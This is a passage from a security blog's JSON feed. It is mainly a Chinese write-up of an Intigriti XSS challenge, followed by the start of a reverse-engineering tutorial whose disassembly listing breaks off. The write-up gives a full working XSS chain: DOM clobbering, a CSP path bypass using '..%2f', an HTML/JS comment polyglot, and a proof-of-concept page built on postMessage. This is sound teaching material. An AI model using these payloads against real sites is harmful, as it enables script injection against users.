function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">'href'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'ftp://a:a@a#&lt;img src=x onload=alert(1)>'</span><span class=\"token punctuation\">)</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><br><span class=\"token comment\">// ftp://a:a@a/#%3Cimg%20src=x%20onload=alert(1)%3E1</span></code></pre>\n<p>這又要怎麼辦呢？</p>\n<p>在 <code>log</code> 裡面有一行是 <code>data = parse(data)</code>，而 parse 的程式碼是這樣的：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> <span class=\"token function-variable function\">parse</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> e <span class=\"token operator\">===</span> <span class=\"token string\">'string'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">s</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// make object look like string</span></code></pre>\n<p>如果 e 是字串，那就回傳 <code>s(e)</code>，而這個 s 是另外一個函式。</p>\n<p>當初在看程式碼的時候，我看到 reassign 那邊對於 eval 的檢查時，就注意到了它的規則：<code>RegExp = /^[s-zA-Z-+0-9]+$/;</code>，還有底下這四個函式：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> <span class=\"token function-variable function\">a</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">s</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> s<span class=\"token punctuation\">.</span><span class=\"token function\">anchor</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">let</span> <span class=\"token function-variable function\">s</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">s</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> s<span class=\"token punctuation\">.</span><span class=\"token function\">normalize</span><span class=\"token punctuation\">(</span><span class=\"token string\">'NFC'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">let</span> <span class=\"token function-variable function\">u</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">s</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token function\">unescape</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">let</span> <span class=\"token function-variable function\">t</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">s</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> s<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre>\n<p>其中 s, u 跟 t 這三個字元都是允許的，也就是說，可以透過 reassign 這個指令把他們互換！我們可以把 <code>s</code> 換成 <code>u</code>，這樣 data 就會被 unescape 了！</p>\n<p>所以最後的程式碼會長這樣：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> htmlUrl <span class=\"token operator\">=</span> <span class=\"token string\">'https://challenge-0721.intigriti.io/htmledit.php?code='</span><br><span class=\"token keyword\">const</span> insertPayload<span class=\"token operator\">=</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">&lt;img src=x onerror=alert(1)></span><span class=\"token template-punctuation string\">`</span></span><br><span class=\"token keyword\">const</span> payload <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\"><br>  &lt;a id=\"DEV\">&lt;/a><br>  &lt;iframe name=\"store\" srcdoc='<br>    &lt;a id=\"users\">&lt;/a><br>    &lt;a id=\"users\" name=\"admin\" href=\"ftp://a:a@a#</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">escape</span><span class=\"token punctuation\">(</span>insertPayload<span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">\">&lt;/a><br>  '>&lt;/iframe><br>  &lt;iframe name=\"iframeConsole\" src=\"https://challenge-0721.intigriti.io/console.php\">&lt;/iframe><br></span><span class=\"token template-punctuation string\">`</span></span><br><br><span class=\"token keyword\">var</span> win <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span>htmlUrl <span class=\"token operator\">+</span> <span class=\"token function\">encodeURIComponent</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br><span class=\"token comment\">// 等待 window 載入完成</span><br><span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'go'</span><span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">const</span> credentials <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>    username<span class=\"token operator\">:</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span><br>    password<span class=\"token operator\">:</span> <span class=\"token string\">'a'</span><br>  <span class=\"token punctuation\">}</span><br>  <span class=\"token comment\">// s=u</span><br>  win<span class=\"token punctuation\">.</span>frames<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>    cmd<span class=\"token operator\">:</span> <span class=\"token string\">'reassign'</span><span class=\"token punctuation\">,</span><br>    message<span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>      a<span class=\"token operator\">:</span> <span class=\"token string\">'s'</span><span class=\"token punctuation\">,</span><br>      b<span class=\"token operator\">:</span> <span class=\"token string\">'u'</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>    credentials<br>  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><br><br>  <span class=\"token comment\">// Z=x+1 so Z = x.href + 1</span><br>  win<span class=\"token punctuation\">.</span>frames<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>    cmd<span class=\"token operator\">:</span> <span class=\"token string\">'reassign'</span><span class=\"token punctuation\">,</span><br>    message<span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>      a<span class=\"token operator\">:</span> <span class=\"token string\">'Z'</span><span class=\"token punctuation\">,</span><br>      b<span class=\"token operator\">:</span> <span class=\"token string\">'x+1'</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>    credentials<br>  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><br><br>  <span class=\"token comment\">// log window[Z]</span><br>  win<span class=\"token punctuation\">.</span>frames<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>    cmd<span class=\"token operator\">:</span> <span class=\"token string\">'logv'</span><span class=\"token punctuation\">,</span><br>    message<span class=\"token operator\">:</span> <span class=\"token string\">'Z'</span><span class=\"token punctuation\">,</span><br>    credentials<br>  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5000</span><span class=\"token punctuation\">)</span></code></pre>\n<p>所以 data 會是 <code>ftp://a:a@a#&lt;img src=x onerror=alert(1)&gt;</code>，然後被設定到 HTML 上面，觸發 XSS！</p>\n<p>不，事情沒那麼順利...我忘記有 CSP 了。</p>\n<h2 id=\"%E7%AC%AC%E5%85%AD%E9%97%9C%EF%BC%9A%E7%B9%9E%E9%81%8E-csp\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E5%85%AD%E9%97%9C%EF%BC%9A%E7%B9%9E%E9%81%8E-csp\">#</a> 第六關：繞過 CSP</h2>\n<p>雖然我可以插入任意 HTML，但很遺憾地這個網頁也有 CSP：</p>\n<pre><code>script-src \n'nonce-xxx' \nhttps://challenge-0721.intigriti.io/analytics/ \n'unsafe-eval';\n<p>frame-src https:;</p>\n<p>object-src 'none';base-uri 'none';<br>\n</code></pre></p>\n<p>因為沒有 <code>unsafe-inline</code>，所以我們之前的 payload 是無效的。而這一段 CSP 當中，<code>https://challenge-0721.intigriti.io/analytics/</code> 顯然是個很可疑的路徑。</p>\n<p>這個頁面其實有引入一個 <a href=\"https://challenge-0721.intigriti.io/analytics/main.js\">https://challenge-0721.intigriti.io/analytics/main.js</a> 的檔案，但裡面沒有東西，只有一些註解而已。</p>\n<p>其實看到這邊的時候我就知道要怎麼做了，因為我之前有學到一個繞過 CSP 的技巧，利用<code>%2F</code>（編碼過後的 <code>/</code>）以及前後端對於 URL 解析的不一致。</p>\n<p>以 <code>https://challenge-0721.intigriti.io/analytics/..%2fhtmledit.php</code> 為例，對瀏覽器來說，這個 URL 是在 <code>/analytics</code> 底下，所以可以通過 CSP 的檢查。</p>\n<p>但是對伺服器來說，這一段是 <code>https://challenge-0721.intigriti.io/analytics/../htmledit.php</code> 也就是 <code>https://challenge-0721.intigriti.io/htmledit.php</code></p>\n<p>所以我們成功繞過了 CSP，載入不同路徑的檔案！</p>\n<p>因此現在的目標就變成我們要找一個檔案裡面可以讓我們放 JS 程式碼。看來看去都只有 htmledit.php 能用，但它不是一個 HTML 嗎？</p>\n<h2 id=\"%E7%AC%AC%E4%B8%83%E9%97%9C%EF%BC%9A%E6%A7%8B%E9%80%A0-js-%E7%A8%8B%E5%BC%8F%E7%A2%BC\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%83%E9%97%9C%EF%BC%9A%E6%A7%8B%E9%80%A0-js-%E7%A8%8B%E5%BC%8F%E7%A2%BC\">#</a> 第七關：構造 JS 程式碼</h2>\n<p>如果你還記得的話，這個頁面的開頭有一段是 HTML 的註解：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token comment\">&lt;!-- &amp;lt;img src=x&amp;gt; --></span><br>....</code></pre>\n<p>而在一些情況下，其實這語法也是 JS 的註解。不是我說的，是規格書說的：</p>\n<p><img src=\"/img/posts/huli/xss-0721/spec.png\" alt=\"ECMAScript spec\"></p>\n<p>換句話說呢，我們可以利用這點，做出一個看起來像 HTML，但實際上也是合法 JS 的檔案！</p>\n<p>我最後做出來的 URL 是這樣：<code>https://challenge-0721.intigriti.io/htmledit.php?code=1;%0atop.alert(document.domain);/*</code></p>\n<p>產生的 HTML 長這樣：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token comment\">&lt;!-- 1; 這邊都是註解<br>top.alert(document.domain);/* --></span> 這之後也都是註解了<br><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span><br>...</code></pre>\n<p>第一行是註解，<code>/*</code> 之後也都是註解，所以這一整段其實就是 <code>top.alert(document.domain);</code> 的意思。</p>\n<p>不過這邊可以注意的是 htmledit.php 的 content type 不會變，依然還是 <code>text/html</code>，之所以可以把它當作 JS 引入，是因為同源的關係。如果你是把一個不同源的 HTML 當作 JS 引入，就會被 <a href=\"https://www.chromium.org/Home/chromium-security/corb-for-developers\">CORB</a> 給擋下來。</p>\n<p>做到這邊，我們就可以讓 data 是 <code>&lt;script src=&quot;https://challenge-0721.intigriti.io/htmledit.php?code=1;%0atop.alert(document.domain);/*&quot;&gt;&lt;/script&gt;</code></p>\n<p>這樣就會執行到 <code>text_tag.innerHTML = data</code>，成功在頁面上放進去 script 還繞過了 CSP，完美！</p>\n<p>但可惜的是，還差一點點...</p>\n<h2 id=\"%E7%AC%AC%E5%85%AB%E9%97%9C%EF%BC%9A%E5%9F%B7%E8%A1%8C%E5%8B%95%E6%85%8B%E6%8F%92%E5%85%A5%E7%9A%84-script\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E5%85%AB%E9%97%9C%EF%BC%9A%E5%9F%B7%E8%A1%8C%E5%8B%95%E6%85%8B%E6%8F%92%E5%85%A5%E7%9A%84-script\">#</a> 第八關：執行動態插入的 script</h2>\n<p>就在我以為要過關的時候，卻發現我的 script 怎樣都不會執行。後來用<a href=\"https://stackoverflow.com/questions/1197575/can-scripts-be-inserted-with-innerhtml\">關鍵字</a>去查，才發現如果是用 innerHTML 插入 script 標籤，插入之後是不會去執行的。</p>\n<p>我試著用 <code>innerhtml import script</code> 或是 <code>innerhtml script run</code> 之類的關鍵字去找解法但都沒找到。</p>\n<p>最後，我是突然想到可以試試看 <code>&lt;iframe srcdoc=&quot;...&quot;&gt;</code>，有種死馬當活馬醫的感覺，反正就試試看這樣行不行，沒有損失。</p>\n<p>結果沒想到就可以了。直接 assign 給 innerHTML 不行，但如果內容是：<code>&lt;iframe srcdoc=&quot;&lt;script src='...'&gt;&lt;/script&gt;&quot;</code> 就可以，就會直接載入 script。</p>\n<h2 id=\"%E6%9C%80%E5%BE%8C%E8%A7%A3%E6%B3%95\"><a class=\"direct-link\" href=\"#%E6%9C%80%E5%BE%8C%E8%A7%A3%E6%B3%95\">#</a> 最後解法</h2>\n<p>最後再補充一件事情，我要送出答案之前發現我的答案在 Firefox 上面不能跑，原因是這段程式碼：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>users<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>users<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>admin<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>a<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>在 Chrome 上 <code>window.users</code> 會是 HTMLCollection，但在 Firefox 上面只會拿到一個 a 元素，而 <code>window.users.admin</code> 也就是 undefined。</p>\n<p>但這問題不大，只要多一層 iframe 就可以搞定：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>store<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">srcdoc</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><br>  &lt;iframe srcdoc=<span class=\"token punctuation\">'</span>&lt;a id=admin href=ftp://a:a@a#>&lt;/a><span class=\"token punctuation\">'</span> name=users><br><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>iframe</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>我最後的答案長這樣：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><br><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>XSS POC<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>  <br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span><br><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>    <span class=\"token keyword\">const</span> htmlUrl <span class=\"token operator\">=</span> <span class=\"token string\">'https://challenge-0721.intigriti.io/htmledit.php?code='</span><br>    <span class=\"token keyword\">const</span> exploitSrc <span class=\"token operator\">=</span> <span class=\"token string\">'/analytics/..%2fhtmledit.php?code=1;%0atop.alert(document.domain);/*'</span><br>    <span class=\"token keyword\">const</span> insertPayload<span class=\"token operator\">=</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">&lt;iframe srcdoc=\"&lt;script src=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>exploitSrc<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">>&lt;\\/script>\"></span><span class=\"token template-punctuation string\">`</span></span><br>    <span class=\"token keyword\">const</span> payload <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\"><br>      &lt;a id=\"DEV\">&lt;/a><br>      &lt;iframe name=\"store\" srcdoc=\"<br>        &lt;iframe srcdoc='&lt;a id=admin href=ftp://a:a@a#</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">escape</span><span class=\"token punctuation\">(</span>insertPayload<span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">>&lt;/a>' name=users><br>      \"><br>      &lt;/iframe><br>      &lt;iframe name=\"iframeConsole\" src=\"https://challenge-0721.intigriti.io/console.php\">&lt;/iframe><br>    </span><span class=\"token template-punctuation string\">`</span></span><br>    <span class=\"token keyword\">var</span> win <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span>htmlUrl <span class=\"token operator\">+</span> <span class=\"token function\">encodeURIComponent</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br>    <span class=\"token comment\">// wait for 3s to let window loaded</span><br>    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>      <span class=\"token keyword\">const</span> credentials <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>        username<span class=\"token operator\">:</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span><br>        password<span class=\"token operator\">:</span> <span class=\"token string\">'a'</span><br>      <span class=\"token punctuation\">}</span><br>      win<span class=\"token punctuation\">.</span>frames<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>        cmd<span class=\"token operator\">:</span> <span class=\"token string\">'reassign'</span><span class=\"token punctuation\">,</span><br>        message<span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>          a<span class=\"token operator\">:</span> <span class=\"token string\">'s'</span><span class=\"token punctuation\">,</span><br>          b<span class=\"token operator\">:</span> <span class=\"token string\">'u'</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>        credentials<br>      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><br><br>      win<span class=\"token punctuation\">.</span>frames<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>        cmd<span class=\"token operator\">:</span> <span class=\"token string\">'reassign'</span><span class=\"token punctuation\">,</span><br>        message<span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>          a<span class=\"token operator\">:</span> <span class=\"token string\">'Z'</span><span class=\"token punctuation\">,</span><br>          b<span class=\"token operator\">:</span> <span class=\"token string\">'x+1'</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>        credentials<br>      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><br><br>      win<span class=\"token punctuation\">.</span>frames<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>        cmd<span class=\"token operator\">:</span> <span class=\"token string\">'logv'</span><span class=\"token punctuation\">,</span><br>        message<span class=\"token operator\">:</span> <span class=\"token string\">'Z'</span><span class=\"token punctuation\">,</span><br>        credentials<br>      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3000</span><span class=\"token punctuation\">)</span><br><br>  </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span><br></code></pre>\n<h2 id=\"%E5%85%B6%E4%BB%96%E8%A7%A3%E6%B3%95\"><a class=\"direct-link\" href=\"#%E5%85%B6%E4%BB%96%E8%A7%A3%E6%B3%95\">#</a> 其他解法</h2>\n<p>我的方法是新開一個 window 來 post message，但其實也可以把自己作為 iframe，讓 htmledit.php embed，這樣的話其實也可以用 top.postMessage 去傳送訊息。</p>\n<p>「把自己 embed 在其他網頁中」這個是我很常忘記的一個方法。</p>\n<p>另一個非預期的解法也很神奇，是根據這一段：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">case</span> <span class=\"token string\">\"log\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[log]: \"</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">.</span>type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>  <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>這一段的重點是 <code>type=e.data.message.type</code>，會設置一個 global variable 叫做 type，因此其實可以透過這邊傳入任意 payload，再去呼叫 logv 就好。就省去了把 payload 放在 a 上面那一大堆要處理的事情。</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>我滿喜歡這次的這個題目，因為有種層層關卡的感覺，一關一關慢慢過，每當我以為要破關的時候，就又卡住了，直到最後才把所有關卡都解完，成功執行 XSS。</p>\n<p>從這個挑戰中，可以學習到的前端知識是：</p>\n<ol>\n<li>DOM clobbering</li>\n<li>JS 的註解不是只有 // 跟 /* */</li>\n<li>CSP 針對 path 的繞過</li>\n<li>用 innerHTML 新增的 script 不會執行</li>\n<li>針對上一點，可以用 iframe srcdoc 來繞過（但一般狀況下應該新增一個 script tag 然後 append）</li>\n</ol>\n<p>從這個題目中可以學習或是複習滿多技巧的，CTF 跟這種挑戰有趣的點就在這邊，雖然說每樣東西拆開來可能都知道，但要怎麼精心串起來，是很考驗經驗跟功力的。</p>\n<p>如果對 XSS 挑戰有興趣，可以關注 <a href=\"https://twitter.com/intigriti\">Intigriti</a> 並且等待下一次的挑戰。</p>\n",
      "date_published": "2021-08-05T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/reverse-02/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/reverse-02/",
      "title": "Reverse Engineering 101 — Part 2",
      "content_html": "<!-- summary -->\n<!-- 逆向小白帶著滿箱的知識，準備正式開始拆解小程式啦！ -->\n<!-- summary -->\n<p>part 1 傳送門：<a href=\"https://tech-blog.cymetrics.io/posts/crystal/reverse-01\"><strong>Reverse Engineering 101 — Part 1</strong></a></p>\n<p>熬過了基礎知識的建立，接下來我們來分析一下程式的邏輯吧！</p>\n<h2 id=\"%E4%BA%8B%E4%B8%8D%E5%AE%9C%E9%81%B2%EF%BC%8C%E5%BF%AB%E5%BF%AB%E9%96%8B%E5%A7%8B\"><a class=\"direct-link\" href=\"#%E4%BA%8B%E4%B8%8D%E5%AE%9C%E9%81%B2%EF%BC%8C%E5%BF%AB%E5%BF%AB%E9%96%8B%E5%A7%8B\">#</a> 事不宜遲，快快開始</h2>\n<p>首先先給大家看一下 <code>disas main</code> 的完整結果。</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">Dump of assembler code for function main:<br>   0x0000000000400b1e &lt;+0>:\t    push   rbp<br>   0x0000000000400b1f &lt;+1>:\t    mov    rbp,rsp<br>   0x0000000000400b22 &lt;+4>:\t    sub    rsp,0x20<br>   0x0000000000400b26 &lt;+8>:\t    mov    DWORD PTR [rbp-0xc],0x0<br>   0x0000000000400b2d &lt;+15>:\tmov    DWORD PTR [rbp-0x10],0x0<br>   0x0000000000400b34 &lt;+22>:\tmov    DWORD PTR [rbp-0x14],0x0<br>   0x0000000000400b3b &lt;+29>:\tmov    esi,0x400cd0<br>   0x0000000000400b40 &lt;+34>:\tmov    edi,0x6021a0<br>   0x0000000000400b45 &lt;+39>:\tcall   0x400830 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt><br>   0x0000000000400b4a &lt;+44>:\tlea    rax,[rbp-0xc]<br>   0x0000000000400b4e &lt;+48>:\tmov    rsi,rax<br>   0x0000000000400b51 &lt;+51>:\tmov    edi,0x602080<br>   0x0000000000400b56 &lt;+56>:\tcall   0x400850 &lt;_ZNSirsERi@plt><br>   0x0000000000400b5b &lt;+61>:\tlea    rdx,[rbp-0x10]<br>   0x0000000000400b5f &lt;+65>:\tmov    rsi,rdx<br>   0x0000000000400b62 &lt;+68>:\tmov    rdi,rax<br>   0x0000000000400b65 &lt;+71>:\tcall   0x400850 &lt;_ZNSirsERi@plt><br>   0x0000000000400b6a &lt;+76>:\tlea    rdx,[rbp-0x14]<br>   0x0000000000400b6e &lt;+80>:\tmov    rsi,rdx<br>   